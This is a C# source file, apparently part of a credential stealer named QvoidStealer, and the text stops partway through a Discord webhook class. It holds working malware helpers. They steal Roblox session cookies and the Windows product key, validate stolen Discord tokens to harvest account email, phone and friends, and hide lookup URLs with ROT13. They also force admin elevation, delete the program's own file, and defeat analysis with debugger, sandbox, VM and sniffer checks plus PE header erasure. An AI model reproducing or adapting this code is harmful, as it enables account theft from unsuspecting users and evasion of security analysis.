using Microsoft.Win32;
using Newtonsoft.Json.Linq;
using Newtonsoft.Json.Serialization;
using Newtonsoft.Json;
using QvoidWrapper;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.Sockets;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System;
using System.Security.Principal;
using System.Net.Security;
using System.Text.RegularExpressions;
using QvoidStealer.Miscellaneous.Stealers.Browsers;

namespace QvoidWrapper
{
    internal sealed class Json
    {
        public string Data;
        public Json(string data)
        {
            this.Data = data;
        }
        // Get string value from json dictonary
        public string GetValue(string value)
        {
            string result = String.Empty;
            Regex valueRegex = new Regex($"\"{value}\":\"([^\"]+)\"");
            Match valueMatch = valueRegex.Match(this.Data);
            if (!valueMatch.Success)
                return result;

            result = Regex.Split(valueMatch.Value, "\"")[3];
            return result;
        }
        // Remove string
        public void Remove(string[] values)
        {
            foreach (string value in values)
                this.Data = this.Data.Replace(value, "");
        }
        // Get array from json data
        public string[] SplitData(string delimiter = "},")
        {
            return Regex.Split(this.Data, delimiter);
        }
    }

    static public class Other
    {
        static public string Sort(string input)
        {
            char temp;
            char[] charstr = input.ToCharArray();
            for (int i = 1; i < charstr.Length; i++)
            {
                for (int j = 0; j < charstr.Length - 1; j++)
                {
                    if (charstr[j] > charstr[j + 1])
                    {
                        temp = charstr[j];
                        charstr[j] = charstr[j + 1];
                        charstr[j + 1] = temp;
                    }
                }
            }

            return new string(charstr);
        }

        public static void ExecuteCommand(string fileName, string Args)
        {
            if (!IsAdministrator())
                throw new Exception("Program is not administrator");

            using (Process process = new Process())
            {
                if (Args != "")
                    process.StartInfo.Arguments = Args;

                process.StartInfo.FileName = fileName;
                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                process.StartInfo.UseShellExecute = true;
                process.StartInfo.Verb = "runas";
                process.Start();
            }
        }

        public static bool IsAdministrator()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static void ForceAdministrator()
        {
            while (!IsAdministrator())
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.UseShellExecute = true;
                startInfo.WorkingDirectory = Environment.CurrentDirectory;
                startInfo.FileName = Application.ExecutablePath;
                startInfo.Verb = "runas";

                try { Process.Start(startInfo); }
                catch { continue; }
                Environment.Exit(0);
            }
        }

        public static Color Spectrum(int mode, float time = 0f)
        {
            time = time == 0f ? (float)((DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() % 62830) / 2000.0) : time;
            return Color.FromArgb(255,
                   (int)((Math.Sin(time + (mode / Math.PI)) * .5f + .5f) * 255.0f),
                   (int)((Math.Sin(time + (mode / Math.PI) + 2 * Math.PI / 3) * .5f + .5f) * 255.0f),
                   (int)((Math.Sin(time + (mode / Math.PI) + 4 * Math.PI / 3) * .5f + .5f) * 255.0f));
        }

        public static void SelfDestruct()
        {
            string strName = "destruct.bat";
            string strPath = Path.Combine(Directory.GetCurrentDirectory(), strName);
            string strExe = new FileInfo(Application.ExecutablePath).Name;

            StreamWriter swDestruct = new StreamWriter(strPath);
            swDestruct.WriteLine("attrib \"" + strExe + "\"" + " -a -s -r -h");
            swDestruct.WriteLine(":Repeat");
            swDestruct.WriteLine("del " + "\"" + strExe + "\"");
            swDestruct.WriteLine("if exist \"" + strExe + "\"" + " goto Repeat");
            swDestruct.WriteLine("del \"" + strName + "\"");
            swDestruct.Close();

            Process procDestruct = new Process();
            procDestruct.StartInfo.FileName = "destruct.bat";
            procDestruct.StartInfo.CreateNoWindow = true;
            procDestruct.StartInfo.UseShellExecute = false;

            try
            {
                procDestruct.Start();
            }
            catch (Exception)
            {
                Application.Exit();
            }
        }

        public static string RobloxCookies()
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com", false))
                {
                    if (key == null)
                        return null;

                    string cookie = key.GetValue(".ROBLOSECURITY").ToString();
                    return cookie.Substring(46).Trim('>');
                }
            }
            catch
            { return null; }
        }
    }

    static public class ProcessHandler
    {
        [StructLayout(LayoutKind.Sequential)]
        struct RM_UNIQUE_PROCESS
        {
            public int dwProcessId;
            public System.Runtime.InteropServices.ComTypes.FILETIME ProcessStartTime;
        }

        const int RmRebootReasonNone = 0;
        const int CCH_RM_MAX_APP_NAME = 255;
        const int CCH_RM_MAX_SVC_NAME = 63;

        enum RM_APP_TYPE
        {
            RmUnknownApp = 0,
            RmMainWindow = 1,
            RmOtherWindow = 2,
            RmService = 3,
            RmExplorer = 4,
            RmConsole = 5,
            RmCritical = 1000
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct RM_PROCESS_INFO
        {
            public RM_UNIQUE_PROCESS Process;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = CCH_RM_MAX_APP_NAME + 1)]
            public string strAppName;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = CCH_RM_MAX_SVC_NAME + 1)]
            public string strServiceShortName;

            public RM_APP_TYPE ApplicationType;
            public uint AppStatus;
            public uint TSSessionId;
            [MarshalAs(UnmanagedType.Bool)]
            public bool bRestartable;
        }

        [DllImport("rstrtmgr.dll", CharSet = CharSet.Unicode)]
        static extern int RmRegisterResources(uint pSessionHandle,
                                            UInt32 nFiles,
                                            string[] rgsFilenames,
                                            UInt32 nApplications,
                                            [In] RM_UNIQUE_PROCESS[] rgApplications,
                                            UInt32 nServices,
                                            string[] rgsServiceNames);

        [DllImport("rstrtmgr.dll", CharSet = CharSet.Auto)]
        static extern int RmStartSession(out uint pSessionHandle, int dwSessionFlags, string strSessionKey);

        [DllImport("rstrtmgr.dll")]
        static extern int RmEndSession(uint pSessionHandle);

        [DllImport("rstrtmgr.dll")]
        static extern int RmGetList(uint dwSessionHandle,
                                    out uint pnProcInfoNeeded,
                                    ref uint pnProcInfo,
                                    [In, Out] RM_PROCESS_INFO[] rgAffectedApps,
                                    ref uint lpdwRebootReasons);

        static public List<Process> WhoIsLocking(string path)
        {
            uint handle;
            string key = Guid.NewGuid().ToString();
            List<Process> processes = new List<Process>();

            int res = RmStartSession(out handle, 0, key);
            if (res != 0) throw new Exception("Could not begin restart session.  Unable to determine file locker.");

            try
            {
                const int ERROR_MORE_DATA = 234;
                uint pnProcInfoNeeded = 0,
                    pnProcInfo = 0,
                    lpdwRebootReasons = RmRebootReasonNone;

                string[] resources = new string[] { path };

                res = RmRegisterResources(handle, (uint)resources.Length, resources, 0, null, 0, null);

                if (res != 0) throw new Exception("Could not register resource.");
                res = RmGetList(handle, out pnProcInfoNeeded, ref pnProcInfo, null, ref lpdwRebootReasons);

                if (res == ERROR_MORE_DATA)
                {
                    RM_PROCESS_INFO[] processInfo = new RM_PROCESS_INFO[pnProcInfoNeeded];
                    pnProcInfo = pnProcInfoNeeded;

                    res = RmGetList(handle, out pnProcInfoNeeded, ref pnProcInfo, processInfo, ref lpdwRebootReasons);
                    if (res == 0)
                    {
                        processes = new List<Process>((int)pnProcInfo);
                        for (int i = 0; i < pnProcInfo; i++)
                        {
                            try
                            {
                                processes.Add(Process.GetProcessById(processInfo[i].Process.dwProcessId));
                            }
                            catch (ArgumentException) { }
                        }
                    }
                    else throw new Exception("Could not list processes locking resource.");
                }
                else if (res != 0) throw new Exception("Could not list processes locking resource. Failed to get size of result.");
            }
            finally
            {
                RmEndSession(handle);
            }

            return processes;
        }

        public static void remoteProcessKill(string computerName, string userName, string pword, string processName)
        {
            var connectoptions = new ConnectionOptions();
            connectoptions.Username = userName;
            connectoptions.Password = pword;

            ManagementScope scope = new ManagementScope(@"\\" + computerName + @"\root\cimv2", connectoptions);

            // WMI query
            var query = new SelectQuery("select * from Win32_process where name = '" + processName + "'");

            using (var searcher = new ManagementObjectSearcher(scope, query))
            {
                foreach (ManagementObject process in searcher.Get())
                {
                    process.InvokeMethod("Terminate", null);
                    process.Dispose();
                }
            }
        }

        public static void localProcessKill(string processName)
        {
            foreach (Process p in Process.GetProcessesByName(processName))
            {
                p.Kill();
            }
        }

        [DllImport("kernel32.dll")]
        public static extern bool MoveFileEx(string lpExistingFileName, string lpNewFileName, int dwFlags);

        public const int MOVEFILE_DELAY_UNTIL_REBOOT = 0x4;

    }

    static public class Protection
    {
        [DllImport("ntdll.dll")]
        internal static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        internal static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        internal static extern void BlockInput([In, MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        internal static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        [DllImport("kernel32.dll", SetLastError = true)]
        internal static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("Kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern bool GetModuleHandleEx(UInt32 dwFlags, string lpModuleName, out IntPtr phModule);

        [DllImport("kernel32.dll")]
        internal static extern IntPtr ZeroMemory(IntPtr addr, IntPtr size);

        [DllImport("kernel32.dll")]
        internal static extern IntPtr VirtualProtect(IntPtr lpAddress, IntPtr dwSize, IntPtr flNewProtect, ref IntPtr lpflOldProtect);

        internal static void EraseSection(IntPtr address, int size)
        {
            IntPtr sz = (IntPtr)size;
            IntPtr dwOld = default(IntPtr);
            VirtualProtect(address, sz, (IntPtr)0x40, ref dwOld);
            ZeroMemory(address, sz);
            IntPtr temp = default(IntPtr);
            VirtualProtect(address, sz, dwOld, ref temp);
        }

        public struct PE
        {
            static public int[] SectionTabledWords = new int[] { 0x8, 0xC, 0x10, 0x14, 0x18, 0x1C, 0x24 };
            static public int[] Bytes = new int[] { 0x1A, 0x1B };
            static public int[] Words = new int[] { 0x4, 0x16, 0x18, 0x40, 0x42, 0x44, 0x46, 0x48, 0x4A, 0x4C, 0x5C, 0x5E };
            static public int[] dWords = new int[] { 0x0, 0x8, 0xC, 0x10, 0x16, 0x1C, 0x20, 0x28, 0x2C, 0x34, 0x3C, 0x4C, 0x50, 0x54, 0x58, 0x60, 0x64, 0x68, 0x6C, 0x70, 0x74, 0x104, 0x108, 0x10C, 0x110, 0x114, 0x11C };
        }

        private static string _Id;
        private static int _UniqueSeed = 0;

        static private bool Valid(bool Exit, string[] _rootCaPublicKeys, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslpolicyerrors)
        {
            if (sslpolicyerrors != SslPolicyErrors.None) return false;

            var rootCertificate = SelfSignedCertificate(chain);
            var publicKey = Convert.ToBase64String(rootCertificate.PublicKey.EncodedKeyValue.RawData);
            var result = rootCertificate.Verify() && _rootCaPublicKeys.Contains(publicKey);
            if (!result && Exit)
                Environment.FailFast("Some retard who thinks he can reverse this application.");

            return result;
        }

        static private X509Certificate2 SelfSignedCertificate(X509Chain chain)
        {
            foreach (var x509ChainElement in chain.ChainElements)
            {
                if (x509ChainElement.Certificate.SubjectName.Name != x509ChainElement.Certificate.IssuerName.Name) continue;
                return x509ChainElement.Certificate;
            }
            throw new Exception("Self-signed certificate not found.");
        }

        static public void WebSniffers(bool Exit)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;

            HttpWebRequest.DefaultWebProxy = new WebProxy();
            WebRequest.DefaultWebProxy = new WebProxy();

            if (GetModuleHandle("HTTPDebuggerBrowser.dll") != IntPtr.Zero || GetModuleHandle("FiddlerCore4.dll") != IntPtr.Zero || GetModuleHandle("RestSharp.dll") != IntPtr.Zero || GetModuleHandle("Titanium.Web.Proxy.dll") != IntPtr.Zero)
            {
                Debug.WriteLine("HTTP Debugger detected");
                if (Exit)
                    Environment.FailFast("Some retard who thinks he can reverse this application.");
            }

            try
            {
                var request = (HttpWebRequest)WebRequest.Create(Encryption.ROT13("uggcf://jjj.qebcobk.pbz/bnhgu2/nhgubevmr"));
                request.ServerCertificateValidationCallback = (sender, cert, chain, error) => Valid(Exit, new List<string>() { "MIIBCgKCAQEAxszlc+b71LvlLS0ypt/lgT/JzSVJtnEqw9WUNGeiChywX2mmQLHEt7KP0JikqUFZOtPclNY823Q4pErMTSWC90qlUxI47vNJbXGRfmO2q6Zfw6SE+E9iUb74xezbOJLjBuUIkQzEKEFV+8taiRV+ceg1v01yCT2+OjhQW3cxG42zxyRFmqesbQAUWgS3uhPrUQqYQUEiTmVhh4FBUKZ5XIneGUpX1S7mXRxTLH6YzRoGFqRoc9A0BBNcoXHTWnxV215k4TeHMFYE5RG0KYAS8Xk5iKICEXwnZreIt3jyygqoOKsKZMK/Zl2VhMGhJR6HXRpQCyASzEG7bgtROLhLywIDAQAB" }.ToArray(), cert, chain, error);

                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                response.Close();
            }
            catch { }
        }

        static public void AntiDebug(bool Exit)
        {
#if !DEBUG
            bool isDebuggerPresent = true;
            CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
            if (isDebuggerPresent)
            {
                Debug.WriteLine("Fuck you!");
                if (Exit)
                    Environment.FailFast("Some retard who thinks he can reverse this application.");
            }
#endif
        }

        static public void Sandboxie(bool Exit)
        {
            if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
            {
                Debug.WriteLine("Sandboxie detected");
                if (Exit)
                    Environment.FailFast("Some retard who thinks he can reverse this application.");
            }
        }

        static public void Emulation(bool Exit)
        {
            long tickCount = Environment.TickCount;
            Thread.Sleep(500);
            long tickCount2 = Environment.TickCount;
            if (((tickCount2 - tickCount) < 500L))
            {
                Debug.WriteLine("Emulation Detected");
                if (Exit)
                    Environment.FailFast("Some retard who thinks he can reverse this application.");
            }
        }

        static public void DetectVM(bool Exit)
        {
            using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
                foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
                    if ((managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
                    {
                        Debug.WriteLine("VM Detected");
                        if (Exit)
                            Environment.FailFast("Some retard who thinks he can reverse this application.");
                    }

            foreach (ManagementBaseObject managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
                if (managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VMware") && managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VBox"))
                {
                    Debug.WriteLine("VM Detected");
                    if (Exit)
                        Environment.FailFast("Some retard who thinks he can reverse this application.");
                }
        }

        static public string DiskId()
        {
            if (!String.IsNullOrEmpty(_Id))
                return _Id;

            try
            {
                ManagementObject _Disk = new ManagementObject(@"win32_logicaldisk.deviceid=""c:""");
                _Disk.Get();

                _Id = $"{_Disk["VolumeSerialNumber"]}";
            }
            catch { _Id = "9SB42HS"; }

            return DiskId();
        }

        static public int UniqueSeed()
        {
            if (_UniqueSeed != 0)
                return _UniqueSeed;

            DiskId();

            int seed = 0;
            foreach (char i in _Id)
                seed += (int)Char.GetNumericValue(i);

            _UniqueSeed = seed;
            return seed;
        }

        static public void AntiDump()
        {
            var process = Process.GetCurrentProcess();
            var base_address = process.MainModule.BaseAddress;
            var dwpeheader = Marshal.ReadInt32((IntPtr)(base_address + 0x3C));
            var wnumberofsections = Marshal.ReadInt16((IntPtr)(base_address + dwpeheader + 0x6));

            EraseSection(base_address, 30);

            for (int i = 0; i < PE.dWords.Length; i++)
                EraseSection((IntPtr)(base_address + dwpeheader + PE.dWords[i]), 4);

            for (int i = 0; i < PE.Words.Length; i++)
                EraseSection((IntPtr)(base_address + dwpeheader + PE.Words[i]), 2);

            for (int i = 0; i < PE.Bytes.Length; i++)
                EraseSection((IntPtr)(base_address + dwpeheader + PE.Bytes[i]), 1);

            int x = 0;
            int y = 0;

            while (x <= wnumberofsections)
            {
                if (y == 0)
                    EraseSection((IntPtr)((base_address + dwpeheader + 0xFA + (0x28 * x)) + 0x20), 2);

                EraseSection((IntPtr)((base_address + dwpeheader + 0xFA + (0x28 * x)) + PE.SectionTabledWords[y]), 4);

                y++;

                if (y == PE.SectionTabledWords.Length)
                {
                    x++;
                    y = 0;
                }
            }
        }
    }

    public class Machine
    {
        static private string[] SizeSuffixes { get; } = { "bytes", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB" };
        public string WindowsLicense { get; private set; }
        public string PublicIPv4 { get; private set; }
        public string LanIPv4 { get; private set; }
        public string OsName { get; private set; }
        public string OsArchitecture { get; private set; }
        public string OsVersion { get; private set; }
        public string ProcessName { get; private set; }
        public string GpuVideo { get; private set; }
        public string GpuVersion { get; private set; }
        public string DiskDetails { get; private set; }
        public string PcMemory { get; private set; }

        public Machine()
        {
            ManagementObjectSearcher ObjSearcher = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
            foreach (ManagementObject _obj in ObjSearcher.Get())
            {
                if (_obj["Caption"] != null)
                    OsName = _obj["Caption"].ToString();

                if (_obj["OSArchitecture"] != null)
                    OsArchitecture = _obj["OSArchitecture"].ToString();

                if (_obj["Version"] != null)
                    OsVersion = _obj["Version"].ToString();
            }

            RegistryKey CentralProcessor = Registry.LocalMachine.OpenSubKey(@"Hardware\Description\System\CentralProcessor\0", RegistryKeyPermissionCheck.ReadSubTree);

            if (CentralProcessor != null)
            {
                var value = CentralProcessor.GetValue("ProcessorNameString");
                if (value != null)
                    ProcessName = value.ToString();
            }

            ObjSearcher = new ManagementObjectSearcher("select * from Win32_VideoController");
            foreach (ManagementObject _obj in ObjSearcher.Get())
            {
                GpuVideo = _obj["VideoProcessor"].ToString();
                GpuVersion = _obj["DriverVersion"].ToString();
            }

            DriveInfo[] Drives = DriveInfo.GetDrives();
            foreach (DriveInfo _drive in Drives)
                if (_drive.IsReady)
                    DiskDetails += $"Drive {_drive.Name}\\ - {SizeSuffix(_drive.AvailableFreeSpace)}/{SizeSuffix(_drive.TotalSize)}{Environment.NewLine}";

            ObjSearcher = new ManagementObjectSearcher("SELECT Capacity FROM Win32_PhysicalMemory");

            Int64 Capacity = 0;
            foreach (ManagementObject WniPART in ObjSearcher.Get())
                Capacity += Convert.ToInt64(WniPART.Properties["Capacity"].Value);

            PcMemory = SizeSuffix(Capacity);

            IPHostEntry ipHostEntry = Dns.GetHostEntry(string.Empty);
            foreach (IPAddress address in ipHostEntry.AddressList)
            {
                if (address.AddressFamily == AddressFamily.InterNetwork)
                {
                    LanIPv4 = address.ToString();
                    break;
                }
            }

            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Encryption.ROT13("uggc://vspbasvt.zr"));
            request.Proxy = null;
            request.UserAgent = "curl";
            try
            {
                PublicIPv4 = new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd().Replace("\n", "").Replace("\r", "");
            }
            catch
            { }

            if (string.IsNullOrEmpty(PublicIPv4))
            {
                request = (HttpWebRequest)WebRequest.Create(Encryption.ROT13("uggcf://ncv.vcvsl.bet?sbezng=wfba"));
                request.Proxy = null;
                request.UserAgent = "curl";
                try
                {
                    PublicIPv4 = JObject.Parse(new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd().Replace("\n", "").Replace("\r", ""))["ip"].ToString();
                }
                catch { }
            }

            WindowsLicense = GetProductKey();
        }

        public static string GetProductKey()
        {
            var localKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32);

            if (Environment.Is64BitOperatingSystem)
                localKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);

            var registryKeyValue = localKey.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion").GetValue("DigitalProductId");
            if (registryKeyValue == null)
                return "Failed to get DigitalProductId from registry";
            var digitalProductId = (byte[])registryKeyValue;

            return DecodeProductKey(digitalProductId);
        }

        private static string DecodeProductKey(byte[] digitalProductId)
        {
            var key = String.Empty;
            const int keyOffset = 52;
            var isWin8 = (byte)((digitalProductId[66] / 6) & 1);
            digitalProductId[66] = (byte)((digitalProductId[66] & 0xf7) | (isWin8 & 2) * 4);

            const string digits = "BCDFGHJKMPQRTVWXY2346789";
            var last = 0;
            for (var i = 24; i >= 0; i--)
            {
                var current = 0;
                for (var j = 14; j >= 0; j--)
                {
                    current = current * 256;
                    current = digitalProductId[j + keyOffset] + current;
                    digitalProductId[j + keyOffset] = (byte)(current / 24);
                    current = current % 24;
                    last = current;
                }
                key = digits[current] + key;
            }

            var keypart1 = key.Substring(1, last);
            var keypart2 = key.Substring(last + 1, key.Length - (last + 1));
            key = keypart1 + "N" + keypart2;

            for (var i = 5; i < key.Length; i += 6)
            {
                key = key.Insert(i, "-");
            }

            return key;
        }

        private static string SizeSuffix(Int64 value)
        {
            if (value < 0)
                return "-" + SizeSuffix(-value);

            if (value == 0)
                return "0.0 bytes";

            int mag = (int)Math.Log(value, 1024);
            return $"{(decimal)value / (1L << (mag * 10))} {SizeSuffixes[mag]}";
        }
    }

    public class Encryption
    {
        public static string ComputeSha256Hash(string rawData)
        {
            using (SHA256 sha256Hash = SHA256.Create())
            {
                byte[] bytes = sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(rawData));
                StringBuilder builder = new StringBuilder();
                for (int i = 0; i < bytes.Length; i++)
                    builder.Append(bytes[i].ToString("x2"));

                return builder.ToString();
            }
        }

        public static string SHA256CheckSum(string filePath)
        {
            using (SHA256 SHA256 = SHA256Managed.Create())
            {
                try
                {
                    using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                        return Convert.ToBase64String(SHA256.ComputeHash(fileStream));
                }
                catch { return null; }
            }
        }

        private static byte[] StringToByteArray(string hex)
        {
            //Haha belongs to the Shabak
            return (from x in Enumerable.Range(0, hex.Length)
                    where x % 2 == 0
                    select Convert.ToByte(hex.Substring(x, 2), 16)).ToArray<byte>();
        }

        public static string StrXOR(string input, byte key, bool encrypt)
        {
            Thread.Sleep(20);

            string output = string.Empty;
            if (encrypt)
            {
                foreach (char c in input)
                    output += (c ^ key).ToString("X2");
            }
            else
            {
                try
                {
                    byte[] strBytes = StringToByteArray(input);
                    foreach (byte b in strBytes)
                        output += (char)(b ^ key);
                }
                catch
                {
                    return string.Empty;
                }
            }

            return output;
        }

        public static string GenerateKey()
        {
            return "IndexOutOfRangeException%__@LIORLUBMAN@__%IndexOutOfRangeException";
        }

        public static string GenerateKey(int size, bool lowerCase, int seed = 0)
        {
            Random r = new Random();
            if (seed != 0)
                r = new Random(seed);

            string output = "";

            for (int i = 0; i < size; ++i)
            {
                int[] rs = { r.Next('0', '9' + 1), r.Next('a', 'z' + 1), r.Next('A', 'Z' + 1) };
                output += (char)rs[r.Next(3)];
            }

            return lowerCase ? output.ToLower() : output.ToUpper();
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }

        public static string Base64Decode(string base64EncodedData)
        {
            return Encoding.UTF8.GetString(Convert.FromBase64String(base64EncodedData));
        }

        public static string StrXOR(string input, bool encrypt, int Length = 1000)
        {
            Thread.Sleep(20);

            string key = string.Empty;
            string output = string.Empty;
            if (encrypt)
            {
                key = GenerateKey(Length, false);
                output = key;
                for (int i = 0; i < input.Length; ++i)
                    output += (input[i] ^ key[i % key.Length]).ToString("X2");
            }
            else
            {
                try
                {
                    key = input.Remove(Length);
                    byte[] strBytes = StringToByteArray(input.Substring(Length));
                    for (int i = 0; i < strBytes.Length; ++i)
                        output += (char)(strBytes[i] ^ key[i % key.Length]);
                }
                catch
                {
                    return string.Empty;
                }
            }

            return output;
        }

        public static string StrXOR(string input, string key, bool encrypt)
        {
            Thread.Sleep(20);

            if (key.Length == 0)
                return string.Empty;

            string output = string.Empty;
            if (encrypt)
            {
                for (int i = 0; i < input.Length; ++i)
                    output += (input[i] ^ key[i % key.Length]).ToString("X2");
            }
            else
            {
                try
                {
                    byte[] strBytes = StringToByteArray(input);
                    for (int i = 0; i < strBytes.Length; ++i)
                        output += (char)(strBytes[i] ^ key[i % key.Length]);
                }
                catch
                {
                    return string.Empty;
                }
            }

            return output;
        }

        public static string ROT13(string value)
        {
            char[] array = value.ToCharArray();
            for (int i = 0; i < array.Length; i++)
            {
                int number = (int)array[i];

                if (number >= 'a' && number <= 'z')
                {
                    if (number > 'm')
                        number -= 13;
                    else
                        number += 13;
                }
                else if (number >= 'A' && number <= 'Z')
                {
                    if (number > 'M')
                        number -= 13;
                    else
                        number += 13;
                }

                array[i] = (char)number;
            }
            return new string(array);
        }
    }

    static public class Notepad
    {
        [DllImport("user32.dll", EntryPoint = "SetWindowText")]
        static private extern int SetWindowText(IntPtr hWnd, string text);

        [DllImport("user32.dll", EntryPoint = "FindWindowEx")]
        static private extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);

        [DllImport("User32.dll", EntryPoint = "SendMessage")]
        static private extern int SendMessage(IntPtr hWnd, int uMsg, int wParam, string lParam);

        static public void Show(string message, string title = null)
        {
            Process notepad = Process.Start(new ProcessStartInfo("notepad.exe"));
            if (notepad != null)
            {
                notepad.WaitForInputIdle();

                if (!string.IsNullOrEmpty(title))
                    SetWindowText(notepad.MainWindowHandle, title);

                if (!string.IsNullOrEmpty(message))
                {
                    IntPtr child = FindWindowEx(notepad.MainWindowHandle, new IntPtr(0), "Edit", null);
                    SendMessage(child, 0x000C, 0, message);
                }
            }
        }
    }

    public class DiscordClient
    {
        private string Endpoint { get; } = "https://discord.com/api/v9/users/@me";
        public ulong Id { get; private set; }
        public string Username { get; private set; }
        public string Discriminator { get; private set; }
        public bool IsValidToken { get; private set; } = true;
        public string Avatar { get; private set; }
        public bool Verified { get; private set; }
        public string Email { get; private set; }
        public string Banner { get; private set; }
        public int? AccentColor { get; private set; }
        public PremiumType Premium { get; private set; }
        public string Phone { get; private set; }
        public DateTimeOffset CreatedAt { get; private set; }
        public string Token { get; private set; }

        public enum PremiumType
        {
            None = 0,
            Nitro_Classic = 1,
            Nitro = 2
        }

        public DiscordClient(string token)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(Endpoint);
            request.Headers.Set("Authorization", token);

            string response = new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd().Replace("\n", "").Replace("\r", "");
            JObject jData = null;

            try
            {
                jData = JObject.Parse(response);

                this.Id = ulong.Parse($"{jData["id"]}");
                this.Username = $"{jData["username"]}";
                this.Discriminator = $"{jData["discriminator"]}";
                this.Avatar = $"{jData["avatar"]}";
                this.Verified = $"{jData["verified"]}".ToLower().StartsWith("tru");
                this.Email = $"{jData["email"]}";
                this.Banner = $"{jData["banner"]}";
                this.Phone = $"{jData["phone"]}";
                this.CreatedAt = DateTimeOffset.FromUnixTimeMilliseconds((long)((this.Id >> 22) + 1420070400000UL));
                this.AccentColor = int.Parse(!String.IsNullOrEmpty($"{jData["accent_color"]}") ? $"{jData["accent_color"]}" : "0");
                this.Token = token;

                if (!String.IsNullOrEmpty($"{jData["premium_type"]}"))
                    this.Premium = (PremiumType)Enum.Parse(typeof(PremiumType), $"{jData["premium_type"]}");
            }
            catch (Exception ex) { IsValidToken = ex.Message.Contains("401"); }
        }

        public List<DiscordUser> GetFriends()
        {
            var friends = new List<DiscordUser>();

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://discord.com/api/v9/users/@me/relationships");
            request.Headers.Add("Authorization", this.Token);

            string response = new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd().Replace("\n", "").Replace("\r", "");
            var jArray = JArray.Parse(response);
            for (int i = 0; i < jArray.Count; ++i)
                friends.Add(JsonConvert.DeserializeObject<DiscordUser>(jArray[i]["user"].ToString()));

            return friends;
        }
    }

    public class DiscordUser
    {
        public ulong Id;
        public int Type;
        public string Nickname;
        public string Username;
        public string Discriminator;
        public int PublicFlags;
        public string Avatar;

        public DiscordUser(ulong Id, int Type, string Nickname, string Username, string Discriminator, int PublicFlags, string Avatar)
        {
            this.Id = Id;
            this.Type = Type;
            this.Nickname = Nickname;
            this.Username = Username;
            this.Discriminator = Discriminator;
            this.PublicFlags = PublicFlags;
            this.Avatar = Avatar;
        }
    }

    public class DiscordWebhook
    {
        public struct DiscordMessage
        {
            /// <summary>
            /// Message content
            /// </summary>
            public string Content;

            /// <summary>
            /// Read message to everyone on the channel
            /// </summary>
            public bool TTS;

            /// <summary>
            /// Webhook profile username to be shown
            /// </summary>
            public string Username;

            /// <summary>
            /// Webhook profile avater to be shown
            /// </summary>
            public string AvatarUrl;

            /// <summary>
            /// List of embeds
            /// </summary>
            public List<DiscordEmbed> Embeds;

            public override string ToString() => Utils.StructToJson(this).ToString(Formatting.None);
        }

        /// <summary>
        /// Discord embed data object
        /// </summary>
        public struct DiscordEmbed
        {
            /// <summary>
            /// Embed title
            /// </summary>
            public string Title;

            /// <summary>
            /// Embed description
